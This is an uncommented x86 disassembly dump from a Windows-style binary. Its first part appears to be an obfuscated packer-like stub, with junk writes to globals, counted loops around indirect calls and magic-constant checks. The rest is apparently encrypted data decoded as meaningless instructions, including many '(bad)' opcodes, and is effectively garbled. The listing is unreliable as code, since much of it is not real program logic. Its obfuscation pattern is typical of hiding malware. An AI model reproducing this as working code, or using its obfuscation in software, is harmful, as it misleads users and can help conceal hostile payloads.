  40a368:	sub    DWORD PTR ds:0x42a00c,0x429018
  40a372:	add    eax,0x3272dd
  40a377:	adc    DWORD PTR ds:0x42d00c,0x760b
  40a381:	mov    DWORD PTR [edx],eax
  40a383:	dec    edx
  40a384:	mov    eax,ds:0x42e2ad
  40a389:	sub    DWORD PTR ds:0x429008,ecx
  40a38f:	mov    edx,DWORD PTR [ebp-0x4]
  40a392:	mov    eax,DWORD PTR [eax]
  40a394:	and    DWORD PTR ds:0x42d004,0x42a01c
  40a39e:	add    eax,DWORD PTR [edx]
  40a3a0:	push   edi
  40a3a1:	mov    DWORD PTR [ebp-0x8],eax
  40a3a4:	and    DWORD PTR ds:0x42c008,0x0
  40a3ae:	jmp    0x40a3c0
  40a3b3:	mov    edi,DWORD PTR ds:0x42c008
  40a3b9:	inc    edi
  40a3ba:	mov    DWORD PTR ds:0x42c008,edi
  40a3c0:	cmp    DWORD PTR ds:0x42c008,0x1f
  40a3c7:	jae    0x40a451
  40a3cd:	cmp    DWORD PTR ds:0x42c008,0x25
  40a3d4:	jne    0x40a3e8
  40a3da:	push   0x3550
  40a3df:	push   DWORD PTR [ebp-0x1c]
  40a3e2:	call   DWORD PTR ds:0x42ed35
  40a3e8:	jmp    0x40a3b3
  40a3ed:	and    DWORD PTR ds:0x42d018,0x0
  40a3f7:	jmp    0x40a407
  40a3fc:	mov    eax,ds:0x42d018
  40a401:	inc    eax
  40a402:	mov    ds:0x42d018,eax
  40a407:	cmp    DWORD PTR ds:0x42d018,0x1a
  40a40e:	jae    0x40a451
  40a414:	cmp    DWORD PTR ds:0x42d018,0x8
  40a41b:	jne    0x40a434
  40a421:	push   DWORD PTR [ebp-0x1c]
  40a424:	push   0x42d014
  40a429:	push   0x5fa0
  40a42e:	call   DWORD PTR ds:0x42ed39
  40a434:	cmp    DWORD PTR ds:0x42d018,0x7
  40a43b:	jne    0x40a44c
  40a441:	mov    eax,ds:0x42d018
  40a446:	inc    eax
  40a447:	mov    ds:0x42d018,eax
  40a44c:	jmp    0x40a3fc
  40a451:	mov    edi,DWORD PTR [ebp+0x8]
  40a454:	mov    eax,ds:0x42e435
  40a459:	and    DWORD PTR ds:0x42a00c,0x728
  40a463:	mov    eax,DWORD PTR [eax+0x198]
  40a469:	xor    edi,ecx
  40a46b:	mov    edx,0x3272dd
  40a470:	and    DWORD PTR ds:0x42b010,0x42d000
  40a47a:	add    edi,edx
  40a47c:	mov    DWORD PTR ds:0x429000,0x5af1
  40a486:	cmp    DWORD PTR [eax],edi
  40a488:	je     0x40a49f
  40a48e:	mov    DWORD PTR ds:0x429000,0x225c
  40a498:	mov    eax,DWORD PTR [eax]
  40a49a:	jmp    0x40cc18
  40a49f:	mov    eax,0x3847
  40a4a4:	mov    eax,DWORD PTR [ebp+0x18]
  40a4a7:	cmp    eax,esi
  40a4a9:	mov    DWORD PTR ds:0x429014,0x6496
  40a4b3:	jne    0x40a4d7
  40a4b9:	mov    DWORD PTR ds:0x42b000,0x18c7
  40a4c3:	push   0xf89c85b2
  40a4c8:	mov    DWORD PTR ds:0x42c014,0x18
  40a4d2:	jmp    0x40cc07
  40a4d7:	mov    esi,DWORD PTR [ebp+0x18]
  40a4da:	mov    DWORD PTR ds:0x42b000,ebx
  40a4e0:	mov    eax,0xf89c85b3
  40a4e5:	cmp    esi,eax
  40a4e7:	mov    DWORD PTR ds:0x42b008,0x2007
  40a4f1:	jne    0x40cbf7
  40a4f7:	mov    eax,ds:0x42c008
  40a4fc:	xor    DWORD PTR ds:0x429004,eax
  40a502:	mov    eax,DWORD PTR [ebp+0x10]
  40a505:	dec    esi
  40a506:	xor    eax,ecx
  40a508:	adc    esi,DWORD PTR ds:0x42d008
  40a50e:	add    eax,edx
  40a510:	xor    esi,esi
  40a512:	or     esi,DWORD PTR ds:0x42c008
  40a518:	adc    DWORD PTR ds:0x42d010,esi
  40a51e:	mov    DWORD PTR [ebp-0x18],eax
  40a521:	mov    eax,DWORD PTR [ebp+0xc]
  40a524:	adc    DWORD PTR ds:0x42d010,0x3da6
  40a52e:	mov    esi,DWORD PTR [ebp-0x8]
  40a531:	xor    eax,ecx
  40a533:	add    DWORD PTR ds:0x42d018,0x6859
  40a53d:	add    eax,edx
  40a53f:	imul   eax,DWORD PTR [esi]
  40a542:	mov    esi,DWORD PTR [ebp+0x8]
  40a545:	or     DWORD PTR ds:0x42d014,0x363e
  40a54f:	xor    esi,ecx
  40a551:	mov    DWORD PTR ds:0x42b010,0xc36
  40a55b:	add    esi,edx
  40a55d:	mov    DWORD PTR ds:0x42d010,0x490b
  40a567:	cmp    esi,eax
  40a569:	mov    eax,ds:0x42d018
  40a56e:	mov    eax,DWORD PTR [ebp-0x4]
  40a571:	push   ebx
  40a572:	mov    DWORD PTR ds:0x42a008,0x30a3
  40a57c:	je     0x40a688
  40a582:	mov    DWORD PTR ds:0x42d008,0x4e69
  40a58c:	mov    esi,DWORD PTR [ebp-0x18]
  40a58f:	or     DWORD PTR ds:0x42a01c,0x42c010
  40a599:	add    DWORD PTR [eax],esi
  40a59b:	mov    DWORD PTR ds:0x42b00c,0x14
  40a5a5:	cmp    DWORD PTR ds:0x42b00c,0x0
  40a5ac:	je     0x40a5f7
  40a5b2:	cmp    DWORD PTR ds:0x42b00c,0x3
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x42e0a1
  40a5c4:	push   0x42e035
  40a5c9:	call   DWORD PTR ds:0x42ed3d
  40a5cf:	cmp    DWORD PTR ds:0x42b00c,0x4
  40a5d6:	jne    0x40a5e7
  40a5dc:	mov    eax,ds:0x42b00c
  40a5e1:	dec    eax
  40a5e2:	mov    ds:0x42b00c,eax
  40a5e7:	mov    eax,ds:0x42b00c
  40a5ec:	dec    eax
  40a5ed:	mov    ds:0x42b00c,eax
  40a5f2:	jmp    0x40a5a5
  40a5f7:	mov    eax,DWORD PTR [ebp-0x4]
  40a5fa:	mov    DWORD PTR ds:0x42d004,0x12
  40a604:	cmp    DWORD PTR ds:0x42d004,0x0
  40a60b:	je     0x40a64f
  40a611:	cmp    DWORD PTR ds:0x42d004,0x21
  40a618:	jne    0x40a633
  40a61e:	push   0x5688
  40a623:	push   0x5318
  40a628:	push   0x314e
  40a62d:	call   DWORD PTR ds:0x42ed41
  40a633:	mov    esi,DWORD PTR ds:0x42d004
  40a639:	dec    esi
  40a63a:	mov    DWORD PTR ds:0x42d004,esi
  40a640:	jmp    0x40a604
  40a645:	sub    DWORD PTR ds:0x42c010,0x7728
  40a64f:	mov    esi,DWORD PTR [ebp+0xc]
  40a652:	add    DWORD PTR ds:0x42c018,0x42b00c
  40a65c:	xor    esi,ecx
  40a65e:	xor    DWORD PTR ds:0x429020,0x39e1
  40a668:	add    esi,edx
  40a66a:	xor    DWORD PTR ds:0x42b00c,0x429028
  40a674:	imul   esi,DWORD PTR [eax]
  40a677:	mov    DWORD PTR [eax],esi
  40a679:	mov    DWORD PTR ds:0x42d000,0x1b30
  40a683:	jmp    0x40a68f
  40a688:	and    edi,edi
  40a68a:	mov    esi,DWORD PTR [ebp+0x14]
  40a68d:	xor    DWORD PTR [eax],esi
  40a68f:	sbb    eax,edi
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	mov    DWORD PTR ds:0x429020,0x1e
  40a69e:	cmp    DWORD PTR ds:0x429020,0x0
  40a6a5:	je     0x40a6f7
  40a6ab:	cmp    DWORD PTR ds:0x429020,0xf
  40a6b2:	jne    0x40a6cb
  40a6b8:	push   DWORD PTR [ebp-0x24]
  40a6bb:	push   0x42b000
  40a6c0:	push   0x2936
  40a6c5:	call   DWORD PTR ds:0x42ed45
  40a6cb:	cmp    DWORD PTR ds:0x429020,0x10
  40a6d2:	jne    0x40a6e5
  40a6d8:	mov    esi,DWORD PTR ds:0x429020
  40a6de:	dec    esi
  40a6df:	mov    DWORD PTR ds:0x429020,esi
  40a6e5:	mov    esi,DWORD PTR ds:0x429020
  40a6eb:	dec    esi
  40a6ec:	mov    DWORD PTR ds:0x429020,esi
  40a6f2:	jmp    0x40a69e
  40a6f7:	mov    edi,DWORD PTR [ebp+0x10]
  40a6fa:	xor    edi,ecx
  40a6fc:	mov    esi,0xffcd8d23
  40a701:	mov    ebx,esi
  40a703:	sub    ebx,edi
  40a705:	jmp    0x40caae
  40a70a:	inc    ecx
  40a70b:	sbb    al,0x8b
  40a70e:	fwait
  40a70f:	jnp    0x40a702
  40a711:	mov    BYTE PTR [ebx-0x1ba83f7d],bl
  40a717:	mov    DWORD PTR [esi+0x7a046d25],edx
  40a71d:	jp     0x40a705
  40a71f:	pop    edi
  40a720:	jp     0x40a79c
  40a722:	sub    ah,dh
  40a724:	in     al,dx
  40a725:	mov    ah,0x49
  40a727:	outs   dx,BYTE PTR ds:[esi]
  40a728:	stc    
  40a729:	sub    DWORD PTR [edi],edx
  40a72b:	or     al,0x5e
  40a72d:	retf   
  40a72e:	cmc    
  40a72f:	cmp    al,0xc4
  40a731:	mov    bh,cl
  40a733:	sbb    DWORD PTR [ebp+0x30],edi
  40a736:	sbb    bh,ah
  40a738:	(bad)  
  40a739:	adc    al,0x24
  40a73b:	cwde   
  40a73c:	add    al,0xe7
  40a73e:	test   DWORD PTR [esp+edx*2],0xf512cf33
  40a745:	sbb    eax,0x5ea1125a
  40a74a:	push   ds
  40a74b:	mov    esp,DWORD PTR [esi-0x49969c6f]
  40a751:	test   bl,bl
  40a753:	jmp    0xea8:0x223cc674
  40a75a:	adc    DWORD PTR [edx+eax*1+0x7805d583],esi
  40a761:	pop    edx
  40a762:	adc    ebp,DWORD PTR [ebx-0x79]
  40a765:	cli    
  40a766:	aaa    
  40a767:	je     0x40a73a
  40a769:	jmp    0xe29a:0x9de39e4
  40a770:	scas   al,BYTE PTR es:[edi]
  40a771:	adc    DWORD PTR [ebp+0x72],esi
  40a774:	mov    WORD PTR [ebp-0x2f947618],ss
  40a77a:	arpl   si,di
  40a77c:	cld    
  40a77d:	fiadd  DWORD PTR [ebx-0x2d]
  40a780:	(bad)  
  40a781:	or     al,0xe9
  40a783:	pop    ss
  40a784:	mov    ebx,0x6291e3e2
  40a789:	mov    DWORD PTR [ebp+0x409ad7c7],ecx
  40a78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a790:	imul   ecx,DWORD PTR [edx+0x60427774],0xd9f53979
  40a79a:	arpl   WORD PTR [esi+0x7f],sp
  40a79d:	xchg   DWORD PTR [esi],esi
  40a79f:	fcomp  DWORD PTR [esi]
  40a7a1:	sahf   
  40a7a2:	xchg   edx,eax
  40a7a3:	cmp    al,0x62
  40a7a5:	out    0x83,al
  40a7a7:	jb     0x40a7c0
  40a7a9:	mov    eax,ds:0xcbeaff48
  40a7ae:	lea    eax,[esi+edx*8-0x69]
  40a7b2:	in     al,0x42
  40a7b4:	jecxz  0x40a7cd
  40a7b6:	cmp    DWORD PTR [eax+ebp*4+0x45a31e],eax
  40a7bd:	push   edx
  40a7be:	or     BYTE PTR [edx-0x78],0x97
  40a7c2:	scas   al,BYTE PTR es:[edi]
  40a7c3:	jp     0x40a7de
  40a7c5:	push   ss
  40a7c6:	adc    eax,0xaa9b20b3
  40a7cb:	fisub  WORD PTR gs:[ecx]
  40a7ce:	lods   al,BYTE PTR ds:[esi]
  40a7cf:	call   0x9b300f11
  40a7d4:	inc    esi
  40a7d5:	cmp    DWORD PTR [edx+0x54],0x832a601e
  40a7dc:	(bad)
  40a7e0:	data16 adc al,0xb5
  40a7e3:	adc    al,BYTE PTR [edi+0x4b6d4057]
  40a7e9:	dec    ebx
  40a7ea:	cli    
  40a7eb:	add    eax,0xc85c7d32
  40a7f0:	xor    BYTE PTR [esi+ebp*8+0x15],dh
  40a7f4:	jb     0x40a79c
  40a7f6:	xchg   ecx,eax
  40a7f7:	sbb    al,0xd4
  40a7f9:	xor    esi,0x31
  40a7fc:	(bad)  
  40a7fd:	and    dh,BYTE PTR [esi+eax*4+0x290f1cca]
  40a804:	ror    BYTE PTR [esi-0x265b3ca1],0x8f
  40a80b:	sbb    DWORD PTR [esi-0x348c5cba],esi
  40a811:	out    dx,al
  40a812:	sti    
  40a813:	in     al,0xd
  40a815:	xchg   ecx,ecx
  40a817:	xchg   DWORD PTR [eax+esi*8+0x74],eax
  40a81b:	dec    ebx
  40a81c:	bound  ebx,QWORD PTR [ebp-0xa]
  40a81f:	stos   DWORD PTR es:[edi],eax
  40a820:	push   eax
  40a821:	push   ebp
  40a822:	push   esp
  40a823:	or     BYTE PTR [ebx],dh
  40a825:	add    DWORD PTR [edi],edi
  40a827:	repz adc DWORD PTR [esp+esi*1-0x6a6a6831],ecx
  40a82f:	lds    edx,FWORD PTR [ecx-0x605b4bc5]
  40a835:	cmp    DWORD PTR [edx-0x51fe9e5],ecx
  40a83b:	iret   
  40a83c:	inc    esi
  40a83d:	push   ebx
  40a83e:	mov    esi,0xb881972e
  40a843:	ins    DWORD PTR es:[edi],dx
  40a844:	adc    esp,DWORD PTR [edi+0x6]
  40a847:	add    edx,DWORD PTR [eax+0x64abc9f4]
  40a84d:	xor    esi,DWORD PTR [eax+0x35b60001]
  40a853:	aas    
  40a854:	pop    ebp
  40a855:	ss push ebp
  40a857:	test   al,0xd7
  40a859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a85a:	outs   dx,DWORD PTR ds:[esi]
  40a85b:	fwait
  40a85c:	loope  0x40a870
  40a85e:	mov    BYTE PTR [edi+0x49bf4b3b],dl
  40a864:	cmp    al,0xe5
  40a866:	sbb    BYTE PTR [esi+0x2d],ch
  40a869:	cmp    eax,0x6a8b111c
  40a86e:	push   edi
  40a86f:	outs   dx,DWORD PTR ds:[esi]
  40a870:	add    BYTE PTR [eax+edi*1-0x169d46e9],0xf9
  40a878:	in     al,dx
  40a879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a87b:	mov    DWORD PTR [edi],esp
  40a87d:	loop   0x40a836
  40a87f:	lods   eax,DWORD PTR ds:[esi]
  40a880:	xchg   BYTE PTR [esp+ecx*2+0x56],ch
  40a884:	mov    WORD PTR es:[ebx-0x17],gs
  40a888:	cmp    al,0x4b
  40a88a:	cli    
  40a88b:	lea    ebx,[ebx]
  40a88d:	je     0x40a822
  40a88f:	sbb    al,bl
  40a891:	sub    ecx,esi
  40a893:	ins    BYTE PTR es:[edi],dx
  40a894:	(bad)  
  40a895:	cld    
  40a896:	shr    BYTE PTR [ebx+eiz*2],1
  40a899:	dec    esi
  40a89a:	mov    bl,0xbd
  40a89c:	add    al,0x38
  40a89e:	sti    
  40a89f:	cs dec ecx
  40a8a1:	test   DWORD PTR [edx-0x3c],esi
  40a8a4:	das    
  40a8a5:	or     BYTE PTR [eax-0x5e],0x6b
  40a8a9:	loop   0x40a888
  40a8ab:	in     eax,0x72
  40a8ad:	jmp    0x40a8f7
  40a8af:	daa    
  40a8b0:	and    BYTE PTR [ebx+edx*4-0x6e],dh
  40a8b4:	icebp  
  40a8b5:	pop    edx
  40a8b6:	out    0xa0,al
  40a8b8:	mov    edi,0xf145bbe1
  40a8bd:	xor    dl,ah
  40a8bf:	fistp  DWORD PTR [ebp+0x75]
  40a8c2:	and    edi,ecx
  40a8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c5:	out    dx,eax
  40a8c6:	fadd   QWORD PTR [edx-0x27]
  40a8c9:	xor    bh,BYTE PTR [edx+0x4]
  40a8cc:	idiv   BYTE PTR [ebx+ecx*2-0x18732d55]
  40a8d3:	push   ecx
  40a8d4:	loopne 0x40a8f7
  40a8d6:	enter  0x934c,0xb8
  40a8da:	pop    edx
  40a8db:	fst    QWORD PTR [esi-0x34d0d1d]
  40a8e1:	into   
  40a8e2:	inc    edi
  40a8e3:	inc    esp
  40a8e4:	imul   DWORD PTR [edi+0x462ba8f1]
  40a8ea:	cwde   
  40a8eb:	cld    
  40a8ec:	xchg   ebx,eax
  40a8ed:	push   ebp
  40a8ee:	shrd   DWORD PTR [edi+eax*2+0x37ff64d1],eax,cl
  40a8f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f7:	scas   eax,DWORD PTR es:[edi]
  40a8f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f9:	(bad)  
  40a8fa:	out    dx,eax
  40a8fb:	push   ss
  40a8fc:	lea    eax,[eax-0x7a]
  40a8ff:	test   eax,0x9ae4bc84
  40a904:	mov    ds:0x37dc480f,eax
  40a909:	aad    0xe5
  40a90b:	loope  0x40a8f8
  40a90d:	mov    eax,edi
  40a90f:	adc    eax,0xa3895dfe
  40a914:	fidivr DWORD PTR [edi]
  40a916:	push   es
  40a917:	push   ss
  40a918:	jecxz  0x40a975
  40a91a:	aam    0x59
  40a91c:	test   BYTE PTR [ebx+ebx*1-0x2e],dl
  40a920:	std    
  40a921:	imul   ecx,DWORD PTR [esi+0x59a6ee14],0xc1c8a6f6
  40a92b:	jp     0x40a92e
  40a92d:	pusha  
  40a92e:	push   es
  40a92f:	or     ah,bh
  40a931:	ins    BYTE PTR es:[edi],dx
  40a932:	jl     0x40a9ab
  40a934:	loopne 0x40a92b
  40a936:	add    eax,0x14be3a91
  40a93b:	mov    bl,BYTE PTR [eax-0x71]
  40a93e:	gs mov bl,0xab
  40a941:	je     0x40a991
  40a943:	pop    es
  40a944:	cmp    al,0xba
  40a946:	dec    esi
  40a947:	xchg   esi,eax
  40a948:	xchg   edx,eax
  40a949:	sub    al,0x43
  40a94b:	mov    ecx,DWORD PTR [edi]
  40a94d:	sub    eax,0xbd3077e6
  40a952:	push   eax
  40a953:	icebp  
  40a954:	push   esi
  40a955:	inc    eax
  40a956:	xchg   edx,eax
  40a957:	jmp    0xbabb17ba
  40a95c:	and    dl,ch
  40a95e:	xchg   edi,eax
  40a95f:	push   esi
  40a960:	(bad)  
  40a961:	fwait
  40a962:	push   esi
  40a963:	mov    dl,0x1f
  40a965:	fisub  WORD PTR [ecx+ebx*2-0x6f]
  40a969:	nop
  40a96a:	inc    edi
  40a96b:	pop    eax
  40a96c:	ds int3 
  40a96e:	sti    
  40a96f:	pop    ecx
  40a970:	retf   
  40a971:	sbb    dl,al
  40a973:	sub    DWORD PTR [esi-0x15],edi
  40a976:	bound  ebx,QWORD PTR [esi+ebp*2+0x43]
  40a97a:	and    edi,DWORD PTR [esi]
  40a97c:	les    ebp,FWORD PTR [ebx+0x4a9341df]
  40a982:	inc    eax
  40a983:	fdivr  st(0),st
  40a985:	imul   edi,DWORD PTR [ebx],0xc5c37c45
  40a98b:	call   0x61efcbbf
  40a990:	stos   DWORD PTR es:[edi],eax
  40a991:	or     BYTE PTR [edx],bh
  40a993:	shr    BYTE PTR [edx+ebp*2+0x28],cl
  40a997:	hlt    
  40a998:	scas   eax,DWORD PTR es:[edi]
  40a999:	and    esp,DWORD PTR [ebx]
  40a99b:	nop
  40a99c:	retf   0xc5ad
  40a99f:	(bad)  
  40a9a0:	scas   eax,DWORD PTR es:[edi]
  40a9a1:	inc    esp
  40a9a2:	(bad)  
  40a9a3:	ret    
  40a9a4:	(bad)  
  40a9a5:	aad    0xa8
  40a9a7:	cmp    al,0x4b
  40a9a9:	ins    BYTE PTR es:[edi],dx
  40a9aa:	test   BYTE PTR [eax-0x7f],ch
  40a9ad:	jnp    0x40a9fa
  40a9af:	fsubp  st(0),st
  40a9b1:	(bad)  
  40a9b2:	jmp    0x40a9e7
  40a9b4:	sbb    al,0xc3
  40a9b6:	add    ebp,DWORD PTR [esi+0x75]
  40a9b9:	fnstcw WORD PTR [ecx+0x13]
  40a9bc:	xor    BYTE PTR [edx],ah
  40a9be:	dec    edi
  40a9bf:	or     eax,0xf6c7305c
  40a9c4:	cmp    BYTE PTR [edx-0x218d135e],dl
  40a9ca:	fst    DWORD PTR [ebx+esi*1+0x43]
  40a9ce:	xor    al,0xc1
  40a9d0:	adc    eax,0x327dd619
  40a9d5:	rcr    edx,cl
  40a9d7:	rol    DWORD PTR [ecx+0x522e0176],1
  40a9dd:	fnstsw WORD PTR [ebx]
  40a9df:	adc    esp,DWORD PTR [edx]
  40a9e1:	into   
  40a9e2:	pusha  
  40a9e3:	pop    ds
  40a9e4:	movhps xmm7,QWORD PTR [esi-0x2f9a3c7a]
  40a9eb:	inc    ebx
  40a9ec:	jne    0x40a996
  40a9ee:	outs   dx,DWORD PTR ds:[esi]
  40a9ef:	sbb    esp,DWORD PTR [bx]
  40a9f2:	or     edi,DWORD PTR [ecx-0x65]
  40a9f5:	test   DWORD PTR [edi],esp
  40a9f7:	les    ecx,FWORD PTR ds:0xd7c62e6
  40a9fd:	cmp    al,0x9c
  40a9ff:	pop    esp
  40aa00:	cmp    bx,dx
  40aa03:	mov    cl,0x50
  40aa05:	xor    al,0xd8
  40aa07:	in     al,dx
  40aa08:	in     eax,0x6a
  40aa0a:	xchg   esp,eax
  40aa0b:	cmp    eax,0x47f08ae4
  40aa10:	dec    edx
  40aa11:	inc    ebp
  40aa12:	rcr    ebx,0xfe
  40aa15:	sub    al,0x1
  40aa17:	stc    
  40aa18:	or     esi,DWORD PTR [esi+0x53402454]
  40aa1e:	xchg   ebx,eax
  40aa1f:	int3   
  40aa20:	and    esi,DWORD PTR [edi+esi*2+0x16]
  40aa24:	dec    ecx
  40aa25:	sub    BYTE PTR [ecx+0x63a9a5eb],cl
  40aa2b:	push   edx
  40aa2c:	lock jecxz 0x40aa2e
  40aa2f:	ins    DWORD PTR es:[edi],dx
  40aa30:	es dec eax
  40aa32:	data16 shl BYTE PTR [eax-0x4f],cl
  40aa36:	mov    ecx,0x26f98112
  40aa3b:	and    dh,BYTE PTR [ecx+0x61e88d66]
  40aa41:	sub    al,BYTE PTR [edx+esi*8]
  40aa44:	(bad)  
  40aa45:	xlat   BYTE PTR ds:[ebx]
  40aa46:	xchg   ecx,eax
  40aa47:	pop    ss
  40aa48:	jnp    0x40aa04
  40aa4a:	cli    
  40aa4b:	push   ecx
  40aa4c:	push   0xf9908766
  40aa51:	mov    dl,0x3b
  40aa53:	js     0x40aa33
  40aa55:	sub    esi,esp
  40aa57:	ror    BYTE PTR [edx+0x3f887ca3],1
  40aa5d:	fdivr  QWORD PTR [edx+0x35]
  40aa60:	lods   eax,DWORD PTR ds:[esi]
  40aa61:	cli    
  40aa62:	push   ss
  40aa63:	imul   edi,eax,0x7f617331
  40aa69:	mov    ebp,0xf95b35f8
  40aa6e:	dec    esp
  40aa6f:	inc    esp
  40aa70:	inc    edx
  40aa71:	xchg   ah,ch
  40aa73:	aaa    
  40aa74:	sbb    bl,BYTE PTR gs:[bx]
  40aa78:	or     DWORD PTR [ecx-0x1af145e0],eax
  40aa7e:	pop    edi
  40aa7f:	inc    esp
  40aa80:	and    esi,0xe2dfe01c
  40aa86:	aad    0xf5
  40aa88:	xor    ebp,DWORD PTR [eax+0x23]
  40aa8b:	adc    edi,ebp
  40aa8d:	rol    BYTE PTR [eax+0x66],0xd9
  40aa91:	xchg   edi,eax
  40aa92:	and    BYTE PTR [ebx+eiz*1-0x7e],0xf4
  40aa97:	xor    eax,0x43d91882
  40aa9c:	sub    cl,BYTE PTR [ebx+edi*4+0x4e]
  40aaa0:	push   0x5c
  40aaa2:	scas   al,BYTE PTR es:[edi]
  40aaa3:	mov    bl,0xa8
  40aaa5:	xor    ah,BYTE PTR [ecx]
  40aaa7:	pushf  
  40aaa8:	xor    esi,DWORD PTR [edx+0x6cf3c1b1]
  40aaae:	sti    
  40aaaf:	mov    ch,bl
  40aab1:	loopne 0x40aabe
  40aab3:	in     eax,0x63
  40aab5:	dec    esi
  40aab6:	bound  esi,QWORD PTR [edi]
  40aab8:	mov    esp,ebp
  40aaba:	(bad)  [esi]
  40aabc:	xchg   ebp,eax
  40aabd:	mov    al,0x6d
  40aabf:	cmp    ebp,DWORD PTR [eax+0x39]
  40aac2:	int    0xe6
  40aac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aac5:	das    
  40aac6:	shl    dh,1
  40aac8:	fs into 
  40aaca:	test   edi,esi
  40aacc:	rcl    bh,cl
  40aace:	popf   
  40aacf:	cmp    dl,BYTE PTR [ebp+0x6fd259da]
  40aad5:	les    eax,FWORD PTR [eax]
  40aad7:	sbb    bl,BYTE PTR [ebp+edx*1+0x34f2fbc7]
  40aade:	enter  0x13a1,0x8f
  40aae2:	test   ebx,0x5d6301c4
  40aae8:	ja     0x40aafa
  40aaea:	pop    esp
  40aaeb:	pop    ebp
  40aaec:	retf   
  40aaed:	leave  
  40aaee:	and    esp,DWORD PTR [ebx]
  40aaf0:	in     al,dx
  40aaf1:	cwde   
  40aaf2:	mov    ecx,0xdf59aedd
  40aaf7:	enter  0x1feb,0x67
  40aafb:	(bad)  
  40aafc:	ins    DWORD PTR es:[edi],dx
  40aafd:	push   eax
  40aafe:	ss js  0x40ab54
  40ab01:	pop    esp
  40ab02:	or     BYTE PTR [ebp+edx*2-0x57],dl
  40ab06:	outs   dx,BYTE PTR ds:[esi]
  40ab07:	jp     0x40ab0f
  40ab09:	mul    BYTE PTR [esi]
  40ab0b:	imul   edx,esp,0xffffffbb
  40ab0e:	outs   dx,DWORD PTR ds:[esi]
  40ab0f:	aam    0x19
  40ab11:	in     al,dx
  40ab12:	mov    ds:0xe168fdc2,al
  40ab17:	aam    0x4a
  40ab19:	mov    cl,0xa7
  40ab1b:	mov    ecx,DWORD PTR [edx]
  40ab1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1e:	sti    
  40ab1f:	aaa    
  40ab20:	int3   
  40ab21:	fcomi  st,st(5)
  40ab23:	fld    DWORD PTR [edx+edx*1+0x1a]
  40ab27:	mov    cl,0xec
  40ab29:	jecxz  0x40ab8c
  40ab2b:	ret    0x49ed
  40ab2e:	mov    DWORD PTR [ecx-0x7c5d012],esp
  40ab34:	call   DWORD PTR [ebx]
  40ab36:	xor    BYTE PTR [edx],ch
  40ab38:	adc    DWORD PTR [edi+0x6c],edi
  40ab3b:	xchg   esp,eax
  40ab3c:	mov    esi,0xfc797ca0
  40ab41:	leave  
  40ab42:	cmp    al,bh
  40ab44:	pop    ebp
  40ab45:	fmul   DWORD PTR [edx]
  40ab47:	push   ebp
  40ab48:	xor    DWORD PTR [ebx],ebp
  40ab4a:	and    al,0xa
  40ab4c:	sbb    dl,cl
  40ab4e:	scas   al,BYTE PTR es:[edi]
  40ab4f:	cs ss std 
  40ab52:	jg     0x40ab19
  40ab54:	xchg   esp,eax
  40ab55:	xor    al,0x2c
  40ab57:	push   esi
  40ab58:	inc    ecx
  40ab59:	push   ds
  40ab5a:	and    esp,edi
  40ab5c:	mov    al,ds:0x6f43a78f
  40ab61:	idiv   DWORD PTR [edi-0x2bdb8b18]
  40ab67:	mov    dh,0x7b
  40ab69:	add    al,0x5b
  40ab6b:	push   ebp
  40ab6c:	fwait
  40ab6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab6e:	(bad)  
  40ab6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab70:	sub    al,0x27
  40ab72:	outs   dx,DWORD PTR ds:[esi]
  40ab73:	lods   al,BYTE PTR ds:[esi]
  40ab74:	ret    0x68b3
  40ab77:	mov    ebx,0x7571cee2
  40ab7c:	pop    DWORD PTR [ecx]
  40ab7e:	add    eax,0x29a3ab9
  40ab83:	pop    es
  40ab84:	push   ebx
  40ab85:	or     DWORD PTR ds:0xca7378af,esi
  40ab8b:	(bad)  
  40ab8d:	cmp    eax,0xce1d15eb
  40ab92:	ins    DWORD PTR es:[edi],dx
  40ab93:	out    dx,eax
  40ab94:	(bad)  
  40ab95:	rcr    esi,1
  40ab97:	div    DWORD PTR [edx+0x2fa870c9]
  40ab9d:	sub    BYTE PTR [ebx-0x58],ch
  40aba0:	and    cl,BYTE PTR [eax+0x77]
  40aba3:	mov    ebp,DWORD PTR [edx-0x3f2eae8c]
  40aba9:	push   eax
  40abaa:	jge    0x40ac08
  40abac:	push   ss
  40abad:	js     0x40ac02
  40abaf:	mov    eax,ds:0xf628b301
  40abb4:	mov    ds:0x31538405,eax
  40abb9:	sbb    al,0xd6
  40abbb:	xor    al,0x9b
  40abbd:	pop    ds
  40abbe:	mov    cl,0xf
  40abc0:	lods   eax,DWORD PTR ds:[esi]
  40abc1:	sub    al,0x18
  40abc3:	or     dl,0xe2
  40abc6:	dec    esp
  40abc7:	scas   al,BYTE PTR es:[edi]
  40abc8:	sub    al,0xaa
  40abca:	icebp  
  40abcb:	mov    ds:0xe15f7714,al
  40abd0:	sar    DWORD PTR [edx+ebp*8+0x4c],1
  40abd4:	sub    edx,DWORD PTR [ebx+0x32f2a665]
  40abda:	pop    edx
  40abdb:	adc    al,0xb3
  40abdd:	pop    edi
  40abde:	jle    0x40abda
  40abe0:	add    cl,BYTE PTR [esi+0x25]
  40abe3:	les    eax,FWORD PTR [esi-0x74]
  40abe6:	or     eax,0xd73c8286
  40abeb:	inc    edx
  40abec:	adc    eax,0x76424fc8
  40abf1:	ds call 0x9d5c9000
  40abf7:	aam    0x3d
  40abf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfa:	test   DWORD PTR [ecx],ecx
  40abfc:	lods   al,BYTE PTR cs:[esi]
  40abfe:	es inc esp
  40ac00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac01:	mov    WORD PTR [eax+0x1c],gs
  40ac04:	stc    
  40ac05:	rcl    dl,0x3e
  40ac08:	mov    ah,BYTE PTR [eax-0x62554a44]
  40ac0e:	leave  
  40ac0f:	xchg   DWORD PTR [ebp+0x401ba301],eax
  40ac15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac16:	ss ins DWORD PTR es:[edi],dx
